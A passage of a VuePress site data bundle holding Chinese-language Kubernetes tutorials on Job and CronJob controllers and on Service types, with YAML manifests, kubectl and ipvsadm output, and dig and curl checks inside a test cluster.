deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# job\n\njob，主要用于负责 ** 批量处理 (一次要处理指定数量任务) 短暂的一次性 (每个任务仅运行一次就结束)** 任务。job 特点如下：\n\n * 当 job 创建的 pod 执行成功结束时，job 将记录成功结束的 pod 数量\n * 当成功结束的 pod 达到指定的数量时，job 将完成执行\n\n\n\njob 的资源清单文件：\n\napiversion: batch/v1 # 版本号\nkind: job # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: job\nspec: # 详情描述\n  completions: 1 # 指定job需要成功运行pods的次数。默认值: 1\n  parallelism: 1 # 指定job在任一时刻应该并发运行pods的数量。默认值: 1\n  activedeadlineseconds: 30 # 指定job可运行的时间期限，超过时间还未结束，系统将会尝试进行终止。\n  backofflimit: 6 # 指定job失败后进行重试的次数。默认是6\n  manualselector: true # 是否可以使用selector选择器选择pod，默认是false\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchlabels:      # labels匹配规则\n      app: counter-pod\n    matchexpressions: # expressions匹配规则\n      - {key: app, operator: in, values: [counter-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartpolicy: never # 重启策略只能设置为never或者onfailure\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 2;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n> 关于重启策略设置的说明：\n> 如果指定为 onfailure，则 job 会在 pod 出现故障时重启容器，而不是创建 pod，failed 次数不变\n> 如果指定为 never，则 job 会在 pod 出现故障时创建新的 pod，并且故障 pod 不会消失，也不会重启，failed 次数加 1\n> 如果指定为 always 的话，就意味着一直重启，意味着 job 任务会重复去执行了，当然不对，所以不能设置为 always\n\n创建 pc-job.yaml，内容如下：\n\napiversion: batch/v1\nkind: job      \nmetadata:\n  name: pc-job\n  namespace: dev\nspec:\n  manualselector: true\n  selector:\n    matchlabels:\n      app: counter-pod\n  template:\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartpolicy: never\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 创建job\n[root@k8s-master01 ~]# kubectl create -f pc-job.yaml\njob.batch/pc-job created\n\n# 查看job\n[root@k8s-master01 ~]# kubectl get job -n dev -o wide  -w\nname     completions   duration   age   containers   images         selector\npc-job   0/1           21s        21s   counter      busybox:1.30   app=counter-pod\npc-job   1/1           31s        79s   counter      busybox:1.30   app=counter-pod\n\n# 通过观察pod状态可以看到，pod在运行完毕任务后，就会变成completed状态\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname           ready   status     restarts      age\npc-job-rxg96   1/1     running     0            29s\npc-job-rxg96   0/1     completed   0            33s\n\n# 接下来，调整下pod运行的总数量和并行数量 即：在spec下设置下面两个选项\n#  completions: 6 # 指定job需要成功运行pods的次数为6\n#  parallelism: 3 # 指定job并发运行pods的数量为3\n#  然后重新运行job，观察效果，此时会发现，job会每次运行3个pod，总共执行了6个pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname           ready   status    restarts   age\npc-job-684ft   1/1     running   0          5s\npc-job-jhj49   1/1     running   0          5s\npc-job-pfcvh   1/1     running   0          5s\npc-job-684ft   0/1     completed   0          11s\npc-job-v7rhr   0/1     pending     0          0s\npc-job-v7rhr   0/1     pending     0          0s\npc-job-v7rhr   0/1     containercreating   0          0s\npc-job-jhj49   0/1     completed           0          11s\npc-job-fhwf7   0/1     pending             0          0s\npc-job-fhwf7   0/1     pending             0          0s\npc-job-pfcvh   0/1     completed           0          11s\npc-job-5vg2j   0/1     pending             0          0s\npc-job-fhwf7   0/1     containercreating   0          0s\npc-job-5vg2j   0/1     pending             0          0s\npc-job-5vg2j   0/1     containercreating   0          0s\npc-job-fhwf7   1/1     running             0          2s\npc-job-v7rhr   1/1     running             0          2s\npc-job-5vg2j   1/1     running             0          3s\npc-job-fhwf7   0/1     completed           0          12s\npc-job-v7rhr   0/1     completed           0          12s\npc-job-5vg2j   0/1     completed           0          12s\n\n# 删除job\n[root@k8s-master01 ~]# kubectl delete -f pc-job.yaml\njob.batch "pc-job" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# cronjob(cj)\n\ncronjob 控制器以 job 控制器资源为其管控对象，并借助它管理 pod 资源对象，job 控制器定义的作业任务在其控制器资源创建之后便会立即执行，但 cronjob 可以以类似于 linux 操作系统的周期性任务作业计划的方式控制其运行时间点及重复运行的方式。也就是说，cronjob 可以在特定的时间点 (反复的) 去运行 job 任务。\n\n\n\ncronjob 的资源清单文件：\n\napiversion: batch/v1beta1 # 版本号\nkind: cronjob # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: cronjob\nspec: # 详情描述\n  schedule: # cron格式的作业调度运行时间点,用于控制任务在什么时间执行\n  concurrencypolicy: # 并发执行策略，用于定义前一次作业运行尚未完成时是否以及如何运行后一次的作业\n  failedjobhistorylimit: # 为失败的任务执行保留的历史记录数，默认为1\n  successfuljobhistorylimit: # 为成功的任务执行保留的历史记录数，默认为3\n  startingdeadlineseconds: # 启动作业错误的超时时长\n  jobtemplate: # job控制器模板，用于为cronjob控制器生成job对象;下面其实就是job的定义\n    metadata:\n    spec:\n      completions: 1\n      parallelism: 1\n      activedeadlineseconds: 30\n      backofflimit: 6\n      manualselector: true\n      selector:\n        matchlabels:\n          app: counter-pod\n        matchexpressions: 规则\n          - {key: app, operator: in, values: [counter-pod]}\n      template:\n        metadata:\n          labels:\n            app: counter-pod\n        spec:\n          restartpolicy: never \n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 20;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n需要重点解释的几个选项：\nschedule: cron表达式，用于指定任务的执行时间\n    */1    *      *    *     *\n    <分钟> <小时> <日> <月份> <星期>\n\n    分钟 值从 0 到 59.\n    小时 值从 0 到 23.\n    日 值从 1 到 31.\n    月 值从 1 到 12.\n    星期 值从 0 到 6, 0 代表星期日\n    多个时间可以用逗号隔开； 范围可以用连字符给出；*可以作为通配符； /表示每...\nconcurrencypolicy: 比如a任务1分钟运行一次，可是a任务本次运行了超过1分钟，那么是否允许让下个周期的任务运行？\n    allow:   允许jobs并发运行(默认)\n    forbid:  禁止并发运行，如果上一次运行尚未完成，则跳过下一次运行\n    replace: 替换，取消当前正在运行的作业并用新作业替换它\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n创建 pc-cronjob.yaml，内容如下：\n\napiversion: batch/v1beta1\nkind: cronjob\nmetadata:\n  name: pc-cronjob\n  namespace: dev\n  labels:\n    controller: cronjob\nspec:\n  schedule: "*/1 * * * *"\n  jobtemplate:\n    metadata:\n    spec:\n      template:\n        spec:\n          restartpolicy: never\n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# 创建cronjob\n[root@k8s-master01 ~]# kubectl create -f pc-cronjob.yaml\ncronjob.batch/pc-cronjob created\n\n# 查看cronjob\n[root@k8s-master01 ~]# kubectl get cronjobs -n dev\nname         schedule      suspend   active   last schedule   age\npc-cronjob   */1 * * * *   false     0        <none>          6s\n\n# 查看job\n[root@k8s-master01 ~]# kubectl get jobs -n dev\nname                    completions   duration   age\npc-cronjob-1592587800   1/1           28s        3m26s\npc-cronjob-1592587860   1/1           28s        2m26s\npc-cronjob-1592587920   1/1           28s        86s\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\npc-cronjob-1592587800-x4tsm   0/1     completed   0          2m24s\npc-cronjob-1592587860-r5gv4   0/1     completed   0          84s\npc-cronjob-1592587920-9dxxq   1/1     running     0          24s\n\n\n# 删除cronjob\n[root@k8s-master01 ~]# kubectl  delete -f pc-cronjob.yaml\ncronjob.batch "pc-cronjob" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n',charsets:{cjk:!0}},{title:"kubernetes(九) Service介绍、类型及使用",frontmatter:{title:"kubernetes(九) Service介绍、类型及使用",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/608",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/608.kubernetes(%E4%B9%9D)%20Service%E4%BB%8B%E7%BB%8D%E3%80%81%E7%B1%BB%E5%9E%8B%E5%8F%8A%E4%BD%BF%E7%94%A8.html",relativePath:"01.运维/60.Kubernetes/608.kubernetes(九) Service介绍、类型及使用.md",key:"v-5019f548",path:"/kubernetes/608/",headers:[{level:2,title:"Service介绍",slug:"service介绍",normalizedTitle:"service 介绍",charIndex:2},{level:2,title:"Service类型",slug:"service类型",normalizedTitle:"service 类型",charIndex:2300},{level:2,title:"Service使用",slug:"service使用",normalizedTitle:"service 使用",charIndex:3026},{level:3,title:"实验环境准备",slug:"实验环境准备",normalizedTitle:"实验环境准备",charIndex:3041},{level:3,title:"ClusterIP类型的Service",slug:"clusterip类型的service",normalizedTitle:"clusterip 类型的 service",charIndex:4475},{level:3,title:"HeadLiness类型的Service",slug:"headliness类型的service",normalizedTitle:"headliness 类型的 service",charIndex:7662},{level:3,title:"NodePort类型的Service",slug:"nodeport类型的service",normalizedTitle:"nodeport 类型的 service",charIndex:9573},{level:3,title:"LoadBalancer类型的Service",slug:"loadbalancer类型的service",normalizedTitle:"loadbalancer 类型的 service",charIndex:10529},{level:3,title:"ExternalName类型的Service",slug:"externalname类型的service",normalizedTitle:"externalname 类型的 service",charIndex:10687}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"Service介绍 Service类型 Service使用 实验环境准备 ClusterIP类型的Service HeadLiness类型的Service NodePort类型的Service LoadBalancer类型的Service ExternalName类型的Service",content:'# Service 介绍\n\n在 kubernetes 中，pod 是应用程序的载体，我们可以通过 pod 的 ip 来访问应用程序，但是 pod 的 ip 地址不是固定的，这也就意味着不方便直接采用 pod 的 ip 对服务进行访问。\n\n为了解决这个问题，kubernetes 提供了 Service 资源，Service 会对提供同一个服务的多个 pod 进行聚合，并且提供一个统一的入口地址。通过访问 Service 的入口地址就能访问到后面的 pod 服务。\n\n\n\nService 在很多情况下只是一个概念，真正起作用的其实是 kube-proxy 服务进程，每个 Node 节点上都运行着一个 kube-proxy 服务进程。当创建 Service 的时候会通过 api-server 向 etcd 写入创建的 service 的信息，而 kube-proxy 会基于监听的机制发现这种 Service 的变动，然后它会将最新的 Service 信息转换成对应的访问规则。\n\n\n\n规则有 iptables，ipvs 等，简单介绍下 ipvs 规则\n\n[root@node1 ~]# ipvsadm -Ln\nIP Virtual Server version 1.2.1 (size=4096)\nProt LocalAddress:Port Scheduler Flags\n  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n10.97.97.97:80 是 service 提供的访问入口，当访问这个入口的时候，可以发现后面有三个 pod 的服务在等待调用，kube-proxy 会基于 rr（轮询）的策略，将请求分发到其中一个 pod 上去，这个规则会同时在集群内的所有节点上都生成，所以在任何一个节点上访问都可以。\n\nkube-proxy 目前支持三种工作模式:\nuserspace 模式\nuserspace 模式下，kube-proxy 会为每一个 Service 创建一个监听端口，发向 Cluster IP 的请求被 Iptables 规则重定向到 kube-proxy 监听的端口上，kube-proxy 根据 LB 算法选择一个提供服务的 Pod 并和其建立链接，以将请求转发到 Pod 上。 该模式下，kube-proxy 充当了一个四层负责均衡器的角色。由于 kube-proxy 运行在 userspace 中，在进行转发处理时会增加内核和用户空间之间的数据拷贝，虽然比较稳定，但是效率比较低。\n\n\n\niptables 模式\niptables 模式下，kube-proxy 为 service 后端的每个 Pod 创建对应的 iptables 规则，直接将发向 Cluster IP 的请求重定向到一个 Pod IP。 该模式下 kube-proxy 不承担四层负责均衡器的角色，只负责创建 iptables 规则。该模式的优点是较 userspace 模式效率更高，但不能提供灵活的 LB 策略，当后端 Pod 不可用时也无法进行重试。\n\n\n\nipvs 模式\nipvs 模式和 iptables 类似，kube-proxy 监控 Pod 的变化并创建相应的 ipvs 规则。ipvs 相对 iptables 转发效率更高。除此以外，ipvs 支持更多的 LB 算法。\n\n\n\n此模式必须安装 ipvs 内核模块，否则会降级为 iptables，开启 ipvs\n\n[root@k8s-master01 ~]# kubectl edit cm kube-proxy -n kube-system\n# 修改mode: "ipvs"\n[root@k8s-master01 ~]# kubectl delete pod -l k8s-app=kube-proxy -n kube-system\n[root@node1 ~]# ipvsadm -Ln\nIP Virtual Server version 1.2.1 (size=4096)\nProt LocalAddress:Port Scheduler Flags\n  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# Service 类型\n\nService 的资源清单文件：\n\nkind: Service  # 资源类型\napiVersion: v1  # 资源版本\nmetadata: # 元数据\n  name: service # 资源名称\n  namespace: dev # 命名空间\nspec: # 描述\n  selector: # 标签选择器，用于确定当前service代理哪些pod\n    app: nginx\n  type: # Service类型，指定service的访问方式\n  clusterIP:  # 虚拟服务的ip地址\n  sessionAffinity: # session亲和性，支持ClientIP、None两个选项，可以把同一个源的请求，发到一个具体的Pod上\n  ports: # 端口信息\n    - protocol: TCP \n      port: 3017  # service端口\n      targetPort: 5003 # pod端口\n      nodePort: 31122 # 主机端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ntype：\n\n * ClusterIP：默认值，它是 Kubernetes 系统自动分配的虚拟 IP，只能在集群内部访问\n * NodePort：将 Service 通过指定的 Node 上的端口暴露给外部，通过此方法，就可以在集群外部访问服务\n * LoadBalancer：使用外接负载均衡器完成到服务的负载分发，注意此模式需要外部云环境支持\n * ExternalName： 把集群外部的服务引入集群内部，直接使用\n\n\n# Service 使用\n\n\n# 实验环境准备\n\n在使用 service 之前，首先利用 Deployment 创建出 3 个 pod，注意要为 pod 设置 app=nginx-pod 的标签\n创建 deployment.yaml，内容如下：\n\napiVersion: apps/v1\nkind: Deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n[root@k8s-master01 ~]# kubectl create -f deployment.yaml\ndeployment.apps/pc-deployment created\n\n# 查看pod详情\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nNAME                             READY   STATUS     IP            NODE     LABELS\npc-deployment-66cb59b984-8p84h   1/1     Running    10.244.1.39   node1    app=nginx-pod\npc-deployment-66cb59b984-vx8vx   1/1     Running    10.244.2.33   node2    app=nginx-pod\npc-deployment-66cb59b984-wnncx   1/1     Running    10.244.1.40   node1    app=nginx-pod\n\n# 为了方便后面的测试，修改下三台nginx的index.html页面（三台修改的IP地址不一致）\n# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n# echo "10.244.1.39" > /usr/share/nginx/html/index.html\n\n#修改完毕之后，访问测试\n[root@k8s-master01 ~]# curl 10.244.1.39\n10.244.1.39\n[root@k8s-master01 ~]# curl 10.244.2.33\n10.244.2.33\n[root@k8s-master01 ~]# curl 10.244.1.40\n10.244.1.40\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# ClusterIP 类型的 Service\n\n是集群内部地址，只能通过 Node 集群内部访问，创建 service-clusterip.yaml 文件\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-clusterip\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterIP: 10.97.97.97 # service的ip地址，如果不写，默认会生成一个\n  type: ClusterIP\n  ports:\n  - port: 80  # Service端口       \n    targetPort: 80 # pod端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl create -f service-clusterip.yaml\nservice/service-clusterip created\n\n# 查看service\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nNAME                TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)   AGE   SELECTOR\nservice-clusterip   ClusterIP   10.97.97.97   <none>        80/TCP    13s   app=nginx-pod\n\n# 查看service的详细信息\n# 在这里有一个Endpoints列表，里面就是当前service可以负载到的服务入口\n[root@k8s-master01 ~]# kubectl describe svc service-clusterip -n dev\nName:              service-clusterip\nNamespace:         dev\nLabels:            <none>\nAnnotations:       <none>\nSelector:          app=nginx-pod\nType:              ClusterIP\nIP:                10.97.97.97\nPort:              <unset>  80/TCP\nTargetPort:        80/TCP\nEndpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nSession Affinity:  None\nEvents:            <none>\n\n# 查看ipvs的映射规则\n[root@k8s-master01 ~]# ipvsadm -Ln\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n# 访问10.97.97.97:80观察效果\n[root@k8s-master01 ~]# curl 10.97.97.97:80\n10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nEndpoint\n\nEndpoint 是 kubernetes 中的一个资源对象，存储在 etcd 中，用来记录一个 service 对应的所有 pod 的访问地址，它是根据 service 配置文件中 selector 描述产生的。\n\n一个 Service 由一组 Pod 组成，这些 Pod 通过 Endpoints 暴露出来，Endpoints 是实现实际服务的端点集合。换句话说，service 和 pod 之间的联系是通过 endpoints 实现的。\n\n\n\n负载分发策略\n对 Service 的访问被分发到了后端的 Pod 上去，目前 kubernetes 提供了两种负载分发策略：\n\n * 如果不定义，默认使用 kube-proxy 的策略，比如随机、轮询\n * 基于客户端地址的会话保持模式，即来自同一个客户端发起的所有请求都会转发到固定的一个 Pod 上\n   此模式可以使在 spec 中添加 sessionAffinity:ClientIP 选项\n\n# 查看ipvs的映射规则【rr 轮询】\n[root@k8s-master01 ~]# ipvsadm -Ln\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n# 循环访问测试\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97:80; sleep 5; done;\n10.244.1.40\n10.244.1.39\n10.244.2.33\n10.244.1.40\n10.244.1.39\n10.244.2.33\n\n# 修改分发策略----sessionAffinity:ClientIP\n\n# 查看ipvs规则【persistent 代表持久】\n[root@k8s-master01 ~]# ipvsadm -Ln\nTCP  10.97.97.97:80 rr persistent 10800\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n# 循环访问测试\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97; sleep 5; done;\n10.244.2.33\n10.244.2.33\n10.244.2.33\n  \n# 删除service\n[root@k8s-master01 ~]# kubectl delete -f service-clusterip.yaml\nservice "service-clusterip" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# HeadLiness 类型的 Service\n\n在某些场景中，开发人员可能不想使用 Service 提供的负载均衡功能，而希望自己来控制负载均衡策略，针对这种情况，kubernetes 提供了 HeadLiness Service，这类 Service 不会分配 Cluster IP，如果想要访问 service，只能通过 service 的域名进行查询。\n\n创建 service-headliness.yaml\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-headliness\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterIP: None # 将clusterIP设置为None，即可创建headliness Service\n  type: ClusterIP\n  ports:\n  - port: 80    \n    targetPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl create -f service-headliness.yaml\nservice/service-headliness created\n\n# 获取service， 发现CLUSTER-IP未分配\n[root@k8s-master01 ~]# kubectl get svc service-headliness -n dev -o wide\nNAME                 TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)   AGE   SELECTOR\nservice-headliness   ClusterIP   None         <none>        80/TCP    11s   app=nginx-pod\n\n# 查看service详情\n[root@k8s-master01 ~]# kubectl describe svc service-headliness  -n dev\nName:              service-headliness\nNamespace:         dev\nLabels:            <none>\nAnnotations:       <none>\nSelector:          app=nginx-pod\nType:              ClusterIP\nIP:                None\nPort:              <unset>  80/TCP\nTargetPort:        80/TCP\nEndpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nSession Affinity:  None\nEvents:            <none>\n\n# 查看域名的解析情况\n[root@k8s-master01 ~]# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n/ # cat /etc/resolv.conf\nnameserver 10.96.0.10\nsearch dev.svc.cluster.local svc.cluster.local cluster.local\n\n[root@k8s-master01 ~]# dig @10.96.0.10 service-headliness.dev.svc.cluster.local\nservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.1.40\nservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.1.39\nservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# NodePort 类型的 Service\n\n在之前的样例中，创建的 Service 的 ip 地址只有集群内部才可以访问，如果希望将 Service 暴露给集群外部使用，那么就要使用到另外一种类型的 Service，称为 NodePort 类型。NodePort 的工作原理其实就是将 service 的端口映射到 Node 的一个端口上，然后就可以通过 NodeIp:NodePort 来访问 service 了。\n\n\n\n创建 service-nodeport.yaml\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-nodeport\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  type: NodePort # service类型\n  ports:\n  - port: 80\n    nodePort: 30002 # 指定绑定的node的端口(默认的取值范围是：30000-32767), 如果不指定，会默认分配\n    targetPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl create -f service-nodeport.yaml\nservice/service-nodeport created\n\n# 查看service\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nNAME               TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)       SELECTOR\nservice-nodeport   NodePort   10.105.64.191   <none>        80:30002/TCP  app=nginx-pod\n\n# 接下来可以通过电脑主机的浏览器去访问集群中任意一个nodeip的30002端口，即可访问到pod\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# LoadBalancer 类型的 Service\n\nLoadBalancer 和 NodePort 很相似，目的都是向外部暴露一个端口，区别在于 LoadBalancer 会在集群的外部再来做一个负载均衡设备，而这个设备需要外部环境支持的，外部服务发送到这个设备上的请求，会被设备负载之后转发到集群中。\n\n\n\n\n# ExternalName 类型的 Service\n\nExternalName 类型的 Service 用于引入集群外部的服务，它通过 externalName 属性指定外部一个服务的地址，然后在集群内部访问此 service 就可以访问到外部的服务了。\n\n\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-externalname\n  namespace: dev\nspec:\n  type: ExternalName # service类型\n  externalName: www.baidu.com  #改成ip地址也可以\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl  create -f service-externalname.yaml\nservice/service-externalname created\n\n# 域名解析\n[root@k8s-master01 ~]# dig @10.96.0.10 service-externalname.dev.svc.cluster.local\nservice-externalname.dev.svc.cluster.local. 30 IN CNAME www.baidu.com.\nwww.baidu.com.          30      IN      CNAME   www.a.shifen.com.\nwww.a.shifen.com.       30      IN      A       39.156.66.18\nwww.a.shifen.com.       30      IN      A       39.156.66.14\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n',normalizedContent:'# service 介绍\n\n在 kubernetes 中，pod 是应用程序的载体，我们可以通过 pod 的 ip 来访问应用程序，但是 pod 的 ip 地址不是固定的，这也就意味着不方便直接采用 pod 的 ip 对服务进行访问。\n\n为了解决这个问题，kubernetes 提供了 service 资源，service 会对提供同一个服务的多个 pod 进行聚合，并且提供一个统一的入口地址。通过访问 service 的入口地址就能访问到后面的 pod 服务。\n\n\n\nservice 在很多情况下只是一个概念，真正起作用的其实是 kube-proxy 服务进程，每个 node 节点上都运行着一个 kube-proxy 服务进程。当创建 service 的时候会通过 api-server 向 etcd 写入创建的 service 的信息，而 kube-proxy 会基于监听的机制发现这种 service 的变动，然后它会将最新的 service 信息转换成对应的访问规则。\n\n\n\n规则有 iptables，ipvs 等，简单介绍下 ipvs 规则\n\n[root@node1 ~]# ipvsadm -ln\nip virtual server version 1.2.1 (size=4096)\nprot localaddress:port scheduler flags\n  -> remoteaddress:port           forward weight activeconn inactconn\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n10.97.97.97:80 是 service 提供的访问入口，当访问这个入口的时候，可以发现后面有三个 pod 的服务在等待调用，kube-proxy 会基于 rr（轮询）的策略，将请求分发到其中一个 pod 上去，这个规则会同时在集群内的所有节点上都生成，所以在任何一个节点上访问都可以。\n\nkube-proxy 目前支持三种工作模式:\nuserspace 模式\nuserspace 模式下，kube-proxy 会为每一个 service 创建一个监听端口，发向 cluster ip 的请求被 iptables 规则重定向到 kube-proxy 监听的端口上，kube-proxy 根据 lb 算法选择一个提供服务的 pod 并和其建立链接，以将请求转发到 pod 上。 该模式下，kube-proxy 充当了一个四层负责均衡器的角色。由于 kube-proxy 运行在 userspace 中，在进行转发处理时会增加内核和用户空间之间的数据拷贝，虽然比较稳定，但是效率比较低。\n\n\n\niptables 模式\niptables 模式下，kube-proxy 为 service 后端的每个 pod 创建对应的 iptables 规则，直接将发向 cluster ip 的请求重定向到一个 pod ip。 该模式下 kube-proxy 不承担四层负责均衡器的角色，只负责创建 iptables 规则。该模式的优点是较 userspace 模式效率更高，但不能提供灵活的 lb 策略，当后端 pod 不可用时也无法进行重试。\n\n\n\nipvs 模式\nipvs 模式和 iptables 类似，kube-proxy 监控 pod 的变化并创建相应的 ipvs 规则。ipvs 相对 iptables 转发效率更高。除此以外，ipvs 支持更多的 lb 算法。\n\n\n\n此模式必须安装 ipvs 内核模块，否则会降级为 iptables，开启 ipvs\n\n[root@k8s-master01 ~]# kubectl edit cm kube-proxy -n kube-system\n# 修改mode: "ipvs"\n[root@k8s-master01 ~]# kubectl delete pod -l k8s-app=kube-proxy -n kube-system\n[root@node1 ~]# ipvsadm -ln\nip virtual server version 1.2.1 (size=4096)\nprot localaddress:port scheduler flags\n  -> remoteaddress:port           forward weight activeconn inactconn\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# service 类型\n\nservice 的资源清单文件：\n\nkind: service  # 资源类型\napiversion: v1  # 资源版本\nmetadata: # 元数据\n  name: service # 资源名称\n  namespace: dev # 命名空间\nspec: # 描述\n  selector: # 标签选择器，用于确定当前service代理哪些pod\n    app: nginx\n  type: # 